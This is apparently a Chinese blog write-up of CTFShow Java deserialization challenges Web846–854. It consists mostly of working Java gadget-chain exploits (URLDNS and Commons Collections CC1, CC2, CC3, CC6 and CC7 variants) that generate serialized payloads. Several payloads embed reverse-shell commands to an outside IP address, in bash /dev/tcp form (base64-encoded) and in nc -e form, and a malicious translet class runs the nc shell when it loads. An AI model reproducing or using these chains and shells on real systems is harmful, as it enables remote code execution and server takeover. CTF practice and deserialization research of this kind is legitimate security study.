---  
title: CTFShow-Java反序列化篇(1)
subtitle:  
date: 2024-01-19T16:27:48+08:00  
slug: 5fe70d4  
draft: false  
author:      
  name: N1Rvana    
  email: beichenghua@gmail.com      
  avatar: avatar.png      
description:  
keywords:  
license:  
comment: false  
weight: 0  
tags:      
  - CTFSHOW  
categories:      
  - Java  
hiddenFromHomePage: false  
hiddenFromSearch: false  
hiddenFromRss: false  
hiddenFromRelated: false  
summary:  
resources:  
  - name: featured-image  
    src: featured-image.jpg  
  - name: featured-image-preview  
    src: featured-image-preview.jpg  
toc: true  
math: false  
lightgallery: false  
password:  
message:  
repost:  
  enable: true  
  url:  
  
# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter  
---  
  
<!--more-->  
## Web846  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181015366.png)
打开首页，告诉我们是`dns`查询，所以直接用`URLDNS`这条链子  
```java  
package org.example;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.net.URL;    
import java.util.Base64;    
import java.util.HashMap;    
    
    
public class URLDNS {    
    public static void main(String[] args) throws Exception {    
        HashMap h=new HashMap();    
        URL url=new URL("http://7c4597d6-3233-40c6-a484-176b02c0ecff.challenge.ctf.show/");    
        Class cls=Class.forName("java.net.URL");    
        Field f = cls.getDeclaredField("hashCode");    
        f.setAccessible(true);    
        f.set(url,1);    
        h.put(url,1);    
        f.set(url,-1);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(h);    
    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181050438.png)
## Web847  
https://x.hacking8.com/java-runtime.html  
`Java7 commons-collections 3.1`  
用`CC1`的链，  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.map.TransformedMap;    
    
import java.io.*;    
import java.lang.annotation.Target;    
import java.lang.reflect.Constructor;    
import java.util.Base64;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections1 {    
    public static void main(String[] args) throws Exception {    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),    
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
        chainedTransformer.transform(Runtime.class);    
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"});    
        HashMap<Object, Object> map = new HashMap<>();    
        map.put("value", "value");    
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);    
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);    
        AnnotationInvocationHandlerConstructor.setAccessible(true);    
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(o);    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
    
        System.out.println(payload);    
    
    }    
    
    }  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181104182.png)
## Web848  
`Java7 commons-collections 3.1`  
禁用了`TransformedMap`类  
换`CC1`的另一条用`LazyMap`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.map.LazyMap;    
import org.apache.commons.collections.map.TransformedMap;    
    
import java.io.*;    
import java.lang.annotation.Target;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.InvocationHandler;    
import java.lang.reflect.Proxy;    
import java.util.Base64;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections1 {    
    public static void main(String[] args) throws Exception{    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),    
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),    
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);    
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);    
        AnnotationInvocationHandlerConstructor.setAccessible(true);    
        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);    
    
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);    
    
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(o);    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);     
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181118097.png)
## Web849  
`Java8 commons-collections4.0`  
用`CC2`链  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections4.comparators.TransformingComparator;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InstantiateTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
    
import javax.swing.text.AbstractDocument;    
import javax.xml.transform.Templates;    
import javax.xml.ws.spi.Invoker;    
import java.io.*;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.Base64;    
import java.util.PriorityQueue;    
    
public class CommonsCollections2 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});    
    
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));    
    
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);    
    
        priorityQueue.add(templatesImpl);    
        priorityQueue.add(2);    
    
        Class c = transformingComparator.getClass();    
        Field transformerField = c.getDeclaredField("transformer");    
        transformerField.setAccessible(true);    
        transformerField.set(transformingComparator,invokerTransformer);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(priorityQueue);    
    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);    
    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
Test.java  
```java  
import java.io.IOException;    
    
import com.sun.org.apache.xalan.internal.xsltc.DOM;    
import com.sun.org.apache.xalan.internal.xsltc.TransletException;    
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;    
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;    
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;    
    
public class Test extends AbstractTranslet {    
    {    
        try {    
            Runtime.getRuntime().exec("nc 124.220.215.8 4444 -e /bin/sh");    
        } catch (IOException e) {    
            throw new RuntimeException(e);    
        }    
    }    
    
    @Override    
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    
    
    }    
    
    @Override    
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181129267.png)
## Web850  
`Java7 commons-collections3.1`  
用`CC3`链打  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InstantiateTransformer;    
import org.apache.commons.collections.map.LazyMap;    
    
import javax.xml.transform.Templates;    
import java.io.*;    
import java.lang.annotation.Target;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.lang.reflect.InvocationHandler;    
import java.lang.reflect.Proxy;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.Base64;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections3 {    
    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(TrAXFilter.class),    
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})    
        };    
    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);    
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);    
        AnnotationInvocationHandlerConstructor.setAccessible(true);    
        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);    
    
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);    
    
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(o);    
        String p = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(p);    
    
    
    }    
}  
```  
**注**  
这里的恶意类需要用`jdk7`版本编译,否则环境中无法识别到  
https://y4tacker.github.io/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/  
## Web851   
`JDK8 commons-collections4.0`  
用`CC6`的链打，但是需要注意的是导入`org.apache.commons.collections4`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections4.Transformer;    
import org.apache.commons.collections4.functors.ChainedTransformer;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
import org.apache.commons.collections4.keyvalue.TiedMapEntry;    
import org.apache.commons.collections4.map.LazyMap;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.Base64;    
import java.util.HashMap;    
import java.util.HashSet;    
import java.util.Map;    
    
public class CommonsCollections6 {    
    public static void main(String[] args) throws Exception{    
    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),    
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc 124.220.215.8 4444 -e /bin/sh"})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object, Object> Outermap = LazyMap.lazyMap(map, new ConstantTransformer(1));    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(Outermap, "test");    
    
        HashMap<Object, Object> map2 = new HashMap<>();    
        map2.put(tiedMapEntry,"test1");    
        Outermap.remove("test");    
    
        Class c = LazyMap.class;    
        Field factoryField = c.getDeclaredField("factory");    
        factoryField.setAccessible(true);    
        factoryField.set(Outermap,chainedTransformer);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(map2);    
    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);    
    
    }    
}  
```  
需要做修改的是，在4.0版本`decorate`被`lazymap`代替了  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181530285.png)
  
## Web852  
`JDK8 commons-collections4.0`  
继续用上面的`poc`打  
## Web853  
用yuxx师傅的链子，基于`CC7`链修改了适用于`CommonsCollections4.0`的`poc`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections4.Transformer;    
import org.apache.commons.collections4.functors.ChainedTransformer;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
import org.apache.commons.collections4.map.DefaultedMap;    
    
import java.io.*;    
import java.util.HashMap;    
import java.util.Hashtable;    
import java.util.Map;    
import java.lang.reflect.Constructor;    
    
import java.util.Base64;    
import java.io.ByteArrayOutputStream;    
    
public class CommonsCollections7 {    
    public static void main(String[] args) throws Exception{    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),    
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc 124.220.215.8 4444 -e /bin/sh"})    
        };    
        Transformer transformerChain2 = new ChainedTransformer(transformers);    
    
    
        Map hashMap1 = new HashMap();    
        Map hashMap2 = new HashMap();    
        Class<DefaultedMap> d = DefaultedMap.class;    
        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);    
        declaredConstructor.setAccessible(true);    
        DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain2);    
        DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain2);    
    
        defaultedMap1.put("yy", 1);    
        defaultedMap2.put("zZ", 1);    
        Hashtable hashtable = new Hashtable();    
        hashtable.put(defaultedMap1, 1);    
        hashtable.put(defaultedMap2, 1);    
        defaultedMap2.remove("yy");    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(hashtable);    
    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);    
    }    
    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181555285.png)
## Web854  
`JDK8 commons-collections4.0`  
过滤了一些东西  
```  
- TransformedMap  
- PriorityQueue  
- InstantiateTransformer  
- TransformingComparator  
- TemplatesImpl  
- AnnotationInvocationHandler  
- HashSet  
- Hashtable  
- LazyMap  
```  
构造一条新的链子  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections4.Transformer;    
import org.apache.commons.collections4.functors.ChainedTransformer;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
import org.apache.commons.collections4.keyvalue.TiedMapEntry;    
import org.apache.commons.collections4.map.DefaultedMap;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Hashtable;    
import java.util.Map;    
import java.lang.reflect.Constructor;    
    
import java.util.Base64;    
import java.io.ByteArrayOutputStream;    
    
public class CommonsCollections7 {    
    public static void main(String[] args) throws Exception{    
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});    
        Transformer[] transformers=new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),    
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),    
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"nc 124.220.215.8 4444 -e /bin/sh"})    
        };    
        Map innerMap1 = new HashMap();    
        HashMap<Object,Object> map=new HashMap<>();    
        Class<DefaultedMap> d = DefaultedMap.class;    
        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);    
        declaredConstructor.setAccessible(true);    
        DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain);    
        TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, "test");    
        HashMap<Object, Object> hashMap=new HashMap<>();    
        hashMap.put(tiedMapEntry,"test01");    
        map.remove("test");    
    
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");    
        iTransformers.setAccessible(true);    
        iTransformers.set(transformerChain,transformers);    
    
        ByteArrayOutputStream b = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(b);    
        oos.writeObject(hashMap);    
    
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());    
        System.out.println(payload);    
    
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(b.toByteArray()));    
//        ois.readObject();    
    }    
    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181827940.png)
### Web854链子分析  
可以看到上面的`poc`，仍然是调用到了`InvokerTransformer`类中的`transform`方法  
来看一下调用栈  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181843112.png)
可以看到是调用了`DefaultedMap`类中的`get`方法，存在`transform`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181844607.png)
也就是说将之前的`LazyMap`类中的`get`方法，换成了`DefaultedMap`类中的`get`方法  
引用`Evo1ution`师傅总结的一张照片  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401181808130.png)
  
  